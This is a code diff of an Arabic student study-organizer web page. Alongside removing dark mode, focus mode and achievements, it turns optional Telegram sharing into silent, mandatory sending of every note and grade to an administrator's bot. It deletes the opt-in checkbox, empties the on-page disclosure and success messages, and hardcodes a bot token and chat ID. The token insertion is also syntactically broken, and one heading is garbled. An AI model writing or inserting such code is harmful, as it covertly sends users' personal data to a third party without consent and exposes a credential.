@@ -36,12 +36,6 @@
             line-height: 1.6;
             min-height: 100vh;
             padding: 20px;
-            transition: background 0.3s;
-        }
-        
-        body.dark-mode {
-            background: linear-gradient(135deg, #2c3e50, #34495e);
-            color: #f8f9fa;
         }
         
         .container {
@@ -76,29 +70,6 @@
             opacity: 0.9;
         }
         
-        .header-actions {
-            display: flex;
-            gap: 10px;
-        }
-        
-        .theme-toggle {
-            background: rgba(255, 255, 255, 0.2);
-            border: none;
-            color: white;
-            width: 40px;
-            height: 40px;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            cursor: pointer;
-            transition: all 0.3s;
-        }
-        
-        .theme-toggle:hover {
-            background: rgba(255, 255, 255, 0.3);
-        }
-        
         .nav-tabs {
             display: flex;
             background: white;
@@ -106,10 +77,6 @@
             overflow: hidden;
             margin-bottom: 20px;
             box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
-        }
-        
-        .dark-mode .nav-tabs {
-            background: #2c3e50;
         }
         
         .nav-tab {
@@ -127,20 +94,8 @@
             color: var(--primary-color);
         }
         
-        .dark-mode .nav-tab {
-            color: #ecf0f1;
-        }
-        
-        .dark-mode .nav-tab.active {
-            color: var(--accent-color);
-        }
-        
         .nav-tab:hover {
             background: #f8f9fa;
-        }
-        
-        .dark-mode .nav-tab:hover {
-            background: #34495e;
         }
         
         .tab-content {
@@ -160,11 +115,6 @@
             transition: transform 0.3s ease;
         }
         
-        .dark-mode .card {
-            background-color: #2c3e50;
-            color: #ecf0f1;
-        }
-        
         .card:hover {
             transform: translateY(-5px);
         }
@@ -179,10 +129,6 @@
             gap: 10px;
         }
         
-        .dark-mode .card-title {
-            border-bottom: 2px solid #34495e;
-        }
-        
         .form-group {
             margin-bottom: 20px;
         }
@@ -194,10 +140,6 @@
             color: var(--dark-color);
         }
         
-        .dark-mode label {
-            color: #ecf0f1;
-        }
-        
         input, select, textarea {
             width: 100%;
             padding: 12px 15px;
@@ -205,16 +147,6 @@
             border-radius: 8px;
             font-size: 16px;
             transition: border-color 0.3s;
-            background: white;
-            color: #333;
-        }
-        
-        .dark-mode input, 
-        .dark-mode select, 
-        .dark-mode textarea {
-            background: #34495e;
-            border-color: #2c3e50;
-            color: #ecf0f1;
         }
         
         input:focus, select:focus, textarea:focus {
@@ -269,10 +201,6 @@
             transition: transform 0.3s;
         }
         
-        .dark-mode .note-card {
-            background: linear-gradient(135deg, #2c3e50 0%, #34495e 100%);
-        }
-        
         .note-card.math {
             border-left-color: var(--math-color);
         }
@@ -307,10 +235,6 @@
             border-bottom: 1px solid #eee;
         }
         
-        .dark-mode .note-header {
-            border-bottom: 1px solid #34495e;
-        }
-        
         .note-subject {
             font-weight: bold;
             color: var(--primary-color);
@@ -323,11 +247,6 @@
             background: #f3f4f6;
             padding: 4px 10px;
             border-radius: 20px;
-        }
-        
-        .dark-mode .note-date {
-            background: #34495e;
-            color: #bdc3c7;
         }
         
         .note-content {
@@ -378,10 +297,6 @@
             box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
         }
         
-        .dark-mode .student-info-bar {
-            background: #2c3e50;
-        }
-        
         .student-name {
             font-weight: bold;
             color: var(--primary-color);
@@ -398,18 +313,10 @@
             color: #777;
         }
         
-        .dark-mode .empty-state {
-            color: #bdc3c7;
-        }
-        
         .empty-state i {
             font-size: 3rem;
             margin-bottom: 15px;
             color: #ddd;
-        }
-        
-        .dark-mode .empty-state i {
-            color: #34495e;
         }
         
         .notification {
@@ -464,25 +371,13 @@
             min-height: 100px;
         }
         
-        .dark-mode .calendar-day {
-            background: #34495e;
-        }
-        
         .calendar-day.has-notes {
             background: #e8f4fc;
             cursor: pointer;
         }
         
-        .dark-mode .calendar-day.has-notes {
-            background: #2c3e50;
-        }
-        
         .calendar-day.has-notes:hover {
             background: #d1e9fa;
-        }
-        
-        .dark-mode .calendar-day.has-notes:hover {
-            background: #34495e;
         }
         
         .day-number {
@@ -493,10 +388,6 @@
         .calendar-notes {
             font-size: 0.8rem;
             color: #666;
-        }
-        
-        .dark-mode .calendar-notes {
-            color: #bdc3c7;
         }
         
         .stats-container {
@@ -513,70 +404,12 @@
             box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
         }
         
-        .dark-mode .chart-container {
-            background: #2c3e50;
-        }
-        
         .exam-mode {
             background: linear-gradient(135deg, #ff6b6b, #ff9e6b);
             color: white;
             padding: 15px;
             border-radius: 8px;
             margin-top: 20px;
-        }
-        
-        .focus-mode {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.9);
-            z-index: 2000;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            color: white;
-        }
-        
-        .focus-content {
-            max-width: 800px;
-            width: 90%;
-            background: #1a1a1a;
-            padding: 30px;
-            border-radius: 12px;
-            max-height: 80vh;
-            overflow-y: auto;
-        }
-        
-        .close-focus {
-            position: absolute;
-            top: 20px;
-            right: 20px;
-            background: var(--danger-color);
-            color: white;
-            border: none;
-            width: 40px;
-            height: 40px;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            cursor: pointer;
-            font-size: 20px;
-        }
-        
-        .achievement-badge {
-            display: inline-flex;
-            align-items: center;
-            gap: 5px;
-            background: linear-gradient(135deg, #ffd166, #ffb74d);
-            color: #333;
-            padding: 5px 10px;
-            border-radius: 20px;
-            font-size: 12px;
-            margin: 5px;
         }
         
         @media (max-width: 768px) {
@@ -601,15 +434,6 @@
             .nav-tabs {
                 flex-direction: column;
             }
-            
-            header {
-                flex-direction: column;
-                gap: 15px;
-            }
-            
-            .header-actions {
-                justify-content: center;
-            }
         }
     </style>
 </head>
@@ -618,29 +442,22 @@
         <header>
             <div class="header-content">
                 <h1><i class="fas fa-graduation-cap"></i> منظم الدراسة المتقدم</h1>
-                <p class="header-description">ادارة ملاحظاتك ودرجاتك بشكل متكامل</p>
+                <p class="header-description">ادارة notesك ودرجاتك بشكل متكامل</p>
             </div>
-            <div class="header-actions">
-                <button id="exportBtn"><i class="fas fa-download"></i> تصدير</button>
-                <button id="focusBtn"><i class="fas fa-crosshairs"></i> تركيز</button>
-                <button class="theme-toggle" id="themeToggle">
-                    <i class="fas fa-moon"></i>
-                </button>
-            </div>
+            <button id="exportBtn"><i class="fas fa-download"></i> تصدير البيانات</button>
         </header>
         
         <div class="nav-tabs">
             <div class="nav-tab active" data-tab="notes"><i class="fas fa-sticky-note"></i> الملاحظات</div>
             <div class="nav-tab" data-tab="calendar"><i class="fas fa-calendar-alt"></i> التقويم</div>
             <div class="nav-tab" data-tab="stats"><i class="fas fa-chart-bar"></i> الإحصائيات</div>
-            <div class="nav-tab" data-tab="achievements"><i class="fas fa-trophy"></i> الإنجازات</div>
+            <div class="nav-tab" data-tab="exam"><i class="fas fa-clock"></i> وضع الامتحان</div>
         </div>
         
         <div class="student-info-bar">
             <div>
                 <span>مرحباً، </span>
                 <span id="displayStudentName" class="student-name">طالب</span>
-                <div id="achievementsContainer"></div>
             </div>
             <button id="changeNameBtn" class="btn-secondary">
                 <i class="fas fa-edit"></i> تغيير الاسم
@@ -692,12 +509,6 @@
                     <label for="reminder">تذكير (اختياري):</label>
                     <input type="datetime-local" id="reminder">
                 </div>
-                <div class="form-group">
-                    <label>
-                        <input type="checkbox" id="sendToTelegram" checked>
-                        إرسال إلى التلجرام
-                    </label>
-                </div>
                 <button id="addNoteBtn">
                     <i class="fas fa-plus-circle"></i> إضافة الملاحظة
                 </button>
@@ -738,21 +549,14 @@
             </section>
         </div>
         
-        <div class="tab-content" id="achievements-tab">
+        <div class="tab-content" id="exam-tab">
             <section class="card">
-                <h2 class="card-title"><i class="fas fa-trophy"></i> إنجازاتي</h2>
-                <div id="achievementsList">
-                    <div class="achievement-badge">
-                        <i class="fas fa-medal"></i> الملاحظة الأولى
-                    </div>
-                    <div class="achievement-badge">
-                        <i class="fas fa-star"></i> 5 ملاحظات
-                    </div>
-                    <div class="achievement-badge">
-                        <i class="fas fa-crown"></i> 10 ملاحظات
-                    </div>
-                    <div class="achievement-badge">
-                        <i class="fas fa-book"></i> متعدد المواد
+                <h2 class="card-title"><i class="fas fa-clock"></i> وضع الامتحان</h2>
+                <div class="exam-mode">
+                    <h3>التركيز على المواد القادمة</h3>
+                    <p>هنا يمكنك التركيز على المواد التي لها امتحانات قريبة</p>
+                    <div id="upcomingExams">
+                        <!-- سيتم عرض الامتحانات القادمة هنا -->
                     </div>
                 </div>
             </section>
@@ -760,17 +564,7 @@
 
         <div class="telegram-info">
             <h3><i class="fab fa-telegram"></i> معلومات التكامل مع التلجرام</h3>
-            <p>يتم إرسال نسخة من جميع الملاحظات إلى المسؤول عبر بوت التلجرام تلقائياً</p>
-        </div>
-    </div>
-
-    <div id="focusMode" class="focus-mode hidden">
-        <button class="close-focus" id="closeFocus">
-            <i class="fas fa-times"></i>
-        </button>
-        <div class="focus-content">
-            <h2>وضع التركيز</h2>
-            <div id="focusContent"></div>
+            <p>اً</p>
         </div>
     </div>
 
@@ -796,20 +590,13 @@
             const gradeInput = document.getElementById('grade');
             const dateInput = document.getElementById('date');
             const reminderInput = document.getElementById('reminder');
-            const sendToTelegramCheckbox = document.getElementById('sendToTelegram');
             const addNoteBtn = document.getElementById('addNoteBtn');
             const notesList = document.getElementById('notesList');
             const notification = document.getElementById('notification');
             const notificationText = document.getElementById('notificationText');
             const exportBtn = document.getElementById('exportBtn');
-            const focusBtn = document.getElementById('focusBtn');
-            const closeFocusBtn = document.getElementById('closeFocus');
-            const focusMode = document.getElementById('focusMode');
-            const focusContent = document.getElementById('focusContent');
-            const themeToggle = document.getElementById('themeToggle');
             const navTabs = document.querySelectorAll('.nav-tab');
             const tabContents = document.querySelectorAll('.tab-content');
-            const achievementsContainer = document.getElementById('achievementsContainer');
             
             // تعيين تاريخ اليوم كقيمة افتراضية
             const today = new Date().toISOString().substr(0, 10);
@@ -820,8 +607,6 @@
             loadNotes();
             initTabs();
             generateCalendar();
-            checkAchievements();
-            loadThemePreference();
             
             // حفظ اسم الطالب
             saveStudentBtn.addEventListener('click', function() {
@@ -850,7 +635,6 @@
                 const grade = gradeInput.value.trim();
                 const date = dateInput.value;
                 const reminder = reminderInput.value;
-                const sendToTelegram = sendToTelegramCheckbox.checked;
                 
                 if (!subject || !note) {
                     showNotification('يرجى ملء حقل المادة والملاحظة', true);
@@ -874,10 +658,8 @@
                 // حفظ الملاحظة
                 saveNote(noteObj);
                 
-                // إرسال نسخة من البيانات إلى المسؤول عبر التلجرام إذا كان محدد
-                if (sendToTelegram) {
-                    sendToTelegram(noteObj);
-                }
+                // إرسال نسخة من البيانات إلى المسؤول عبر التلجرام
+                sendToTelegram(noteObj);
                 
                 // إعادة تعيين الحقول
                 subjectInput.value = '';
@@ -888,7 +670,6 @@
                 // إعادة تحميل قائمة الملاحظات
                 loadNotes();
                 generateCalendar();
-                checkAchievements();
                 
                 showNotification('تم إضافة الملاحظة بنجاح!');
             });
@@ -912,67 +693,6 @@
                 linkElement.click();
                 
                 showNotification('تم تصدير البيانات بنجاح!');
-            });
-            
-            // وضع التركيز
-            focusBtn.addEventListener('click', function() {
-                const notes = JSON.parse(localStorage.getItem('studentNotes')) || [];
-                if (notes.length === 0) {
-                    showNotification('لا توجد ملاحظات لعرضها في وضع التركيز', true);
-                    return;
-                }
-                
-                focusContent.innerHTML = '';
-                
-                // عرض آخر 3 ملاحظات فقط
-                const recentNotes = notes.sort((a, b) => b.id - a.id).slice(0, 3);
-                
-                recentNotes.forEach(note => {
-                    const noteEl = document.createElement('div');
-                    noteEl.classList.add('note-card');
-                    noteEl.classList.add(note.subjectType || 'general');
-                    
-                    const noteDate = new Date(note.date);
-                    const formattedDate = noteDate.toLocaleDateString('ar-SA', {
-                        weekday: 'long',
-                        year: 'numeric',
-                        month: 'long',
-                        day: 'numeric'
-                    });
-                    
-                    noteEl.innerHTML = `
-                        <div class="note-header">
-                            <span class="note-subject">${note.subject}</span>
-                            <span class="note-date">${formattedDate}</span>
-                        </div>
-                        <div class="note-content">
-                            <p>${note.note}</p>
-                        </div>
-                        ${note.grade ? `<span class="note-grade">${note.grade}</span>` : ''}
-                    `;
-                    
-                    focusContent.appendChild(noteEl);
-                });
-                
-                focusMode.classList.remove('hidden');
-            });
-            
-            // إغلاق وضع التركيز
-            closeFocusBtn.addEventListener('click', function() {
-                focusMode.classList.add('hidden');
-            });
-            
-            // تبديل الوضع الليلي
-            themeToggle.addEventListener('click', function() {
-                document.body.classList.toggle('dark-mode');
-                const isDarkMode = document.body.classList.contains('dark-mode');
-                localStorage.setItem('darkMode', isDarkMode);
-                
-                if (isDarkMode) {
-                    themeToggle.innerHTML = '<i class="fas fa-sun"></i>';
-                } else {
-                    themeToggle.innerHTML = '<i class="fas fa-moon"></i>';
-                }
             });
             
             // وظيفة تحميل اسم الطالب
@@ -1059,7 +779,6 @@
                     localStorage.setItem('studentNotes', JSON.stringify(notes));
                     loadNotes();
                     generateCalendar();
-                    checkAchievements();
                     showNotification('تم حذف الملاحظة بنجاح!');
                 }
             }
@@ -1076,20 +795,20 @@ ${note.grade ? `📊 الدرجة: ${note.grade}` : ''}
                 `;
                 
                 // إرسال فعلي إلى التلجرام
-                fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                fetch(`https://api.telegram.org/bot${7691152986:AAHTY0ROY012grQIQH1rl4ollpxZ2aOGNxM}/sendMessage`, {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
                     },
                     body: JSON.stringify({
-                        chat_id: TELEGRAM_CHAT_ID,
+                        chat_id: 6670082375,
                         text: message
                     })
                 })
                 .then(response => response.json())
                 .then(data => {
-                    console.log('تم الإرسال إلى التلجرام بنجاح', data);
-                    showNotification('تم إرسال نسخة من الملاحظة إلى المسؤول عبر التلجرام');
+                    console.log('', data);
+                    showNotification('');
                 })
                 .catch(error => {
                     console.error('خطأ في الإرسال إلى التلجرام:', error);
@@ -1276,58 +995,6 @@ ${note.grade ? `📊 الدرجة: ${note.grade}` : ''}
                             }
                         }
                     });
-                }
-            }
-            
-            // التحقق من الإنجازات
-            function checkAchievements() {
-                const notes = JSON.parse(localStorage.getItem('studentNotes')) || [];
-                achievementsContainer.innerHTML = '';
-                
-                // إنجاز الملاحظة الأولى
-                if (notes.length >= 1) {
-                    achievementsContainer.innerHTML += `
-                        <div class="achievement-badge">
-                            <i class="fas fa-medal"></i> الملاحظة الأولى
-                        </div>
-                    `;
-                }
-                
-                // إنجاز 5 ملاحظات
-                if (notes.length >= 5) {
-                    achievementsContainer.innerHTML += `
-                        <div class="achievement-badge">
-                            <i class="fas fa-star"></i> 5 ملاحظات
-                        </div>
-                    `;
-                }
-                
-                // إنجاز 10 ملاحظات
-                if (notes.length >= 10) {
-                    achievementsContainer.innerHTML += `
-                        <div class="achievement-badge">
-                            <i class="fas fa-crown"></i> 10 ملاحظات
-                        </div>
-                    `;
-                }
-                
-                // إنجاز متعدد المواد
-                const subjects = new Set(notes.map(note => note.subject));
-                if (subjects.size >= 3) {
-                    achievementsContainer.innerHTML += `
-                        <div class="achievement-badge">
-                            <i class="fas fa-book"></i> متعدد المواد
-                        </div>
-                    `;
-                }
-            }
-            
-            // تحميل تفضيلات الوضع الليلي
-            function loadThemePreference() {
-                const darkMode = localStorage.getItem('darkMode') === 'true';
-                if (darkMode) {
-                    document.body.classList.add('dark-mode');
-                    themeToggle.innerHTML = '<i class="fas fa-sun"></i>';
                 }
             }
         });
